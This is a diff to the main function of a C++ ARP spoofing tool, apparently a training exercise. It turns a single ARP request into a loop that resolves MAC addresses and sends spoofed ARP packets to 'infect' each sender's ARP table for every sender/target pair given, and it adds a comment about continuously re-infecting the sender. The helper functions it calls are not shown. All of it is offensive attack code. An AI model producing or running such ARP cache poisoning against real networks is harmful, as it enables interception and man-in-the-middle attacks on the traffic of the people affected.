@@ -7,9 +7,6 @@ int main(int argc, char* argv[])
 {
     Packet packet;
 
-    u_int32_t senderIp = inet_addr(argv[2]);
-    u_int32_t targetIp = inet_addr(argv[3]);
-
     //Check argument count and validate the format of the IP address
     if (!parse(argc, argv)) return EXIT_FAILURE;
 
@@ -22,15 +19,17 @@ int main(int argc, char* argv[])
     //Set the interface information (IP and MAC) for the packet capture;
     if(!packet.setMyInterfaceInfo()) return EXIT_FAILURE;
 
-    //Set Ethernet header and ARP header
-    packet.setEthHeader(packet.getInterfaceMac(), BROADCAST_MAC, ethHdr::ARP);
-    packet.setArpHeader(packet.getInterfaceMac(), packet.getInterfaceIp(), NULL_MAC, senderIp, arpHdr::ArpRequest);
+    //Get MAC from IP, store in arpTable, and infect sender's ARP table
+    for (int i = 2; i < argc; i += 2){
+        u_int32_t senderIp = inet_addr(argv[i]);
+        u_int32_t targetIp = inet_addr(argv[i+1]);
 
-    //Send the packet
-    packet.sendPacket();
+        packet.resolveMacByIpforSpoof(senderIp, targetIp);
+        packet.sendSpoofedPacket(senderIp, targetIp, arpHdr::ArpRequest);
+    }
 
-    // Get MAC address from IP address
-    packet.resolveMacByIp(senderIp);
+    //Continuously re-infect the sender's ARP table when an ARP packet updates it
+
 
     //Close the live capture session
     packet.closeLiveCapture();
